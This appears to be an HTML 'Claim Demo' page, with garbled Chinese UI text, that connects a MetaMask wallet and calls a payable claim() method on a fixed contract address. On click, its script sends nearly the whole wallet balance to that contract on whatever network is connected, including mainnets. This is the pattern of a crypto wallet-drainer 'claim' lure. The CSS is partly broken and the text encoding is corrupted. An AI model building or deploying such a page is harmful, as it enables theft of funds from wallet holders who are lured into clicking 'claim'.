<!DOCTYPE html>
<html lang="zh-CN">
<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Demo - MetaMask Integration</title>
    <style>
        * {

        body {

        .status.connected {

            border: 2px solid #cfc;
        }

        .status.processing {

            color: #f39c12;
            border: 2px solid #f8e08e;
        }

        button {

            padding: 15px;

            cursor: pointer;
            transition: all 0.3s ease;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .btn-connect {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-claim {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
        }

        .wallet-info {
            background: #e3f2fd;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
        }

        .wallet-info p {
            margin: 8px 0;
            font-size: 14px;
            color: #333;
        }

        .wallet-info strong {
            color: #1976d2;
        }

        .log {
            background: #263238;
            color: #a5d6a7;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            max-height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.6;
        }

        .log-error {
            color: #ef5350;
        }

        .log-success {
            color: #66bb6a;
        }

        .log-info {
            color: #42a5f5;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {

        }

        .network-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 15px;
            font-size: 12px;
            font-weight: 600;
            margin-left: 10px;
        }

        .network-mainnet { background: #4caf50; color: white; }
        .network-testnet { background: #ff9800; color: white; }
        .network-unknown { background: #9e9e9e; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ¦Š Claim Demo</h1>
        
        <div class="contract-info">
            <strong>åˆçº¦åœ°å€:</strong><br>
            <code>0x000008e4e9597890e93F60B4D8DD3610e1700000</code>
        </div>

        <div id="status" class="status disconnected">
            æœªè¿æ¥é’±åŒ…
        </div>

        <button id="connectBtn" class="btn-connect">
            è¿æ¥ MetaMask
        </button>

        <div id="walletInfo" class="wallet-info" style="display: none;">
            <p><strong>é’±åŒ…åœ°å€:</strong> <span id="walletAddress">-</span></p>
            <p><strong>ç½‘ç»œ:</strong> <span id="networkName">-</span><span id="networkBadge"></span></p>
            <p><strong>Chain ID:</strong> <span id="chainId">-</span></p>
            <p><strong>é’±åŒ…ä½™é¢:</strong> <span id="walletBalance">-</span> ETH</p>
        </div>

        <button id="claimBtn" class="btn-claim" disabled>
            è°ƒç”¨ Claim æ–¹æ³• (å‘é€æ‰€æœ‰ä½™é¢)
        </button>

        <div id="log" class="log"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script>
        // åˆçº¦åœ°å€
        const CONTRACT_ADDRESS = '0x000008e4e9597890e93F60B4D8DD3610e1700000';
        
        // åŸºæœ¬çš„ ABIï¼ˆåªåŒ…å« claim æ–¹æ³•ï¼‰
        const CONTRACT_ABI = [
            {
                "name": "claim",
                "type": "function",
                "inputs": [],
                "outputs": [],
                "stateMutability": "payable"
            }
        ];

        // ç½‘ç»œåç§°æ˜ å°„
        const NETWORK_NAMES = {
            '1': 'Ethereum Mainnet',
            '5': 'Goerli Testnet',
            '11155111': 'Sepolia Testnet',
            '56': 'BSC Mainnet',
            '97': 'BSC Testnet',
            '137': 'Polygon Mainnet',
            '80001': 'Mumbai Testnet',
            '42161': 'Arbitrum One',
            '10': 'Optimism',
            '8453': 'Base'
        };

        let provider = null;
        let signer = null;
        let contract = null;
        let userAddress = null;
        let userBalance = null;

        // DOM å…ƒç´ 
        const statusDiv = document.getElementById('status');
        const connectBtn = document.getElementById('connectBtn');
        const claimBtn = document.getElementById('claimBtn');
        const walletInfo = document.getElementById('walletInfo');
        const logDiv = document.getElementById('log');

        // æ—¥å¿—å‡½æ•°
        function log(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const className = `log-${type}`;
            logDiv.innerHTML += `<div class="${className}">[${timestamp}] ${message}</div>`;
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        // æ›´æ–°çŠ¶æ€
        function updateStatus(message, type = 'disconnected') {
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
        }

        // æ£€æŸ¥ MetaMask
        function checkMetaMask() {
            if (typeof window.ethereum === 'undefined') {
                updateStatus('âŒ è¯·å®‰è£… MetaMask', 'disconnected');
                log('MetaMask æœªå®‰è£…', 'error');
                return false;
            }
            log('MetaMask å·²æ£€æµ‹åˆ°', 'success');
            return true;
        }

        // è¿æ¥é’±åŒ…
        async function connectWallet() {
            if (!checkMetaMask()) return;

            try {
                log('æ­£åœ¨è¿æ¥é’±åŒ…...', 'info');
                updateStatus('è¿æ¥ä¸­...', 'processing');

                // è¯·æ±‚è´¦æˆ·è®¿é—®
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });

                userAddress = accounts[0];
                
                // åˆ›å»º provider å’Œ signer
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                
                // åˆ›å»ºåˆçº¦å®ä¾‹
                contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

                // è·å–ç½‘ç»œä¿¡æ¯
                const network = await provider.getNetwork();
                const chainId = network.chainId;
                const networkName = NETWORK_NAMES[chainId.toString()] || 'æœªçŸ¥ç½‘ç»œ';
                const isTestnet = networkName.includes('Testnet');

                // è·å–é’±åŒ…ä½™é¢
                userBalance = await provider.getBalance(userAddress);
                const balanceInEth = ethers.utils.formatEther(userBalance);

                // æ›´æ–° UI
                document.getElementById('walletAddress').textContent = 
                    userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
                document.getElementById('networkName').textContent = networkName;
                document.getElementById('chainId').textContent = chainId;
                document.getElementById('walletBalance').textContent = parseFloat(balanceInEth).toFixed(6);
                
                const badge = document.getElementById('networkBadge');
                badge.className = `network-badge ${isTestnet ? 'network-testnet' : 'network-mainnet'}`;
                badge.textContent = isTestnet ? 'æµ‹è¯•ç½‘' : 'ä¸»ç½‘';

                walletInfo.style.display = 'block';
                connectBtn.textContent = 'å·²è¿æ¥';
                connectBtn.disabled = true;
                claimBtn.disabled = false;

                updateStatus('âœ… é’±åŒ…å·²è¿æ¥', 'connected');
                log(`é’±åŒ…å·²è¿æ¥: ${userAddress}`, 'success');
                log(`ç½‘ç»œ: ${networkName} (Chain ID: ${chainId})`, 'info');
                log(`é’±åŒ…ä½™é¢: ${balanceInEth} ETH`, 'info');

            } catch (error) {
                updateStatus('âŒ è¿æ¥å¤±è´¥', 'disconnected');
                log(`è¿æ¥å¤±è´¥: ${error.message}`, 'error');
                console.error(error);
            }
        }

        // è°ƒç”¨ Claim æ–¹æ³•
        async function callClaim() {
            if (!contract) {
                log('è¯·å…ˆè¿æ¥é’±åŒ…', 'error');
                return;
            }

            try {
                updateStatus('â³ æ­£åœ¨å‘é€äº¤æ˜“...', 'processing');
                claimBtn.innerHTML = '<span class="spinner"></span> å¤„ç†ä¸­...';
                claimBtn.disabled = true;

                log('æ­£åœ¨è°ƒç”¨ claim() æ–¹æ³•...', 'info');
                
                // è·å–å½“å‰æœ€æ–°ä½™é¢
                const currentBalance = await provider.getBalance(userAddress);
                const balanceInEth = ethers.utils.formatEther(currentBalance);
                log(`å½“å‰ä½™é¢: ${balanceInEth} ETH`, 'info');

                // é¢„ä¼° gas è´¹ç”¨ (é¢„ç•™ 0.01 ETH ä½œä¸º gasï¼Œå¦‚æœä½™é¢ä¸è¶³åˆ™å…¨éƒ¨å‘é€)
                const gasReserve = ethers.utils.parseEther("0.01");
                let valueToSend;
                
                if (currentBalance.gt(gasReserve)) {
                    valueToSend = currentBalance.sub(gasReserve);
                    const sendAmount = ethers.utils.formatEther(valueToSend);
                    log(`å°†å‘é€: ${sendAmount} ETH (é¢„ç•™ 0.01 ETH ä½œä¸º gas)`, 'info');
                } else {
                    valueToSend = currentBalance;
                    log(`ä½™é¢è¾ƒå°‘ï¼Œå°†å‘é€å…¨éƒ¨: ${balanceInEth} ETH`, 'info');
                }

                log('ç­‰å¾…ç”¨æˆ·åœ¨ MetaMask ä¸­ç¡®è®¤...', 'info');

                // è°ƒç”¨åˆçº¦æ–¹æ³•ï¼Œé™„å¸¦æ‰€æœ‰ä½™é¢
                const tx = await contract.claim({
                    value: valueToSend
                });
                
                log(`äº¤æ˜“å·²å‘é€: ${tx.hash}`, 'success');
                log(`å·²å‘é€ ${ethers.utils.formatEther(valueToSend)} ETH`, 'success');
                log('ç­‰å¾…åŒºå—ç¡®è®¤...', 'info');

                updateStatus('â³ ç­‰å¾…åŒºå—ç¡®è®¤...', 'processing');

                // ç­‰å¾…äº¤æ˜“ç¡®è®¤
                const receipt = await tx.wait();

                log(`äº¤æ˜“æˆåŠŸ! Gas ä½¿ç”¨: ${receipt.gasUsed.toString()}`, 'success');
                log(`åŒºå—å·: ${receipt.blockNumber}`, 'info');
                log(`æŸ¥çœ‹äº¤æ˜“: https://etherscan.io/tx/${tx.hash}`, 'info');

                // åˆ·æ–°ä½™é¢
                const newBalance = await provider.getBalance(userAddress);
                const newBalanceInEth = ethers.utils.formatEther(newBalance);
                document.getElementById('walletBalance').textContent = parseFloat(newBalanceInEth).toFixed(6);
                log(`æ–°ä½™é¢: ${newBalanceInEth} ETH`, 'info');

                updateStatus('âœ… Claim æˆåŠŸ!', 'connected');
                claimBtn.innerHTML = 'âœ… Claim æˆåŠŸ';

                setTimeout(() => {
                    claimBtn.innerHTML = 'è°ƒç”¨ Claim æ–¹æ³• (å‘é€æ‰€æœ‰ä½™é¢)';
                    claimBtn.disabled = false;
                }, 3000);

            } catch (error) {
                updateStatus('âŒ äº¤æ˜“å¤±è´¥', 'connected');
                claimBtn.innerHTML = 'è°ƒç”¨ Claim æ–¹æ³• (å‘é€æ‰€æœ‰ä½™é¢)';
                claimBtn.disabled = false;

                if (error.code === 4001) {
                    log('ç”¨æˆ·æ‹’ç»äº†äº¤æ˜“', 'error');
                } else if (error.code === -32603) {
                    log(`äº¤æ˜“å¤±è´¥: ${error.message}`, 'error');
                } else {
                    log(`é”™è¯¯: ${error.message}`, 'error');
                }
                console.error(error);
            }
        }

        // ç›‘å¬è´¦æˆ·å˜åŒ–
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    log('è´¦æˆ·å·²æ–­å¼€è¿æ¥', 'error');
                    location.reload();
                } else {
                    log('è´¦æˆ·å·²åˆ‡æ¢ï¼Œæ­£åœ¨é‡æ–°è¿æ¥...', 'info');
                    location.reload();
                }
            });

            window.ethereum.on('chainChanged', (chainId) => {
                log('ç½‘ç»œå·²åˆ‡æ¢ï¼Œæ­£åœ¨åˆ·æ–°é¡µé¢...', 'info');
                location.reload();
            });
        }

        // äº‹ä»¶ç›‘å¬
        connectBtn.addEventListener('click', connectWallet);
        claimBtn.addEventListener('click', callClaim);

        // é¡µé¢åŠ è½½æ—¶æ£€æŸ¥
        window.addEventListener('load', () => {
            checkMetaMask();
            log('é¡µé¢å·²åŠ è½½ï¼Œå‡†å¤‡è¿æ¥ MetaMask', 'info');
        });
    </script>
</body>
</html>
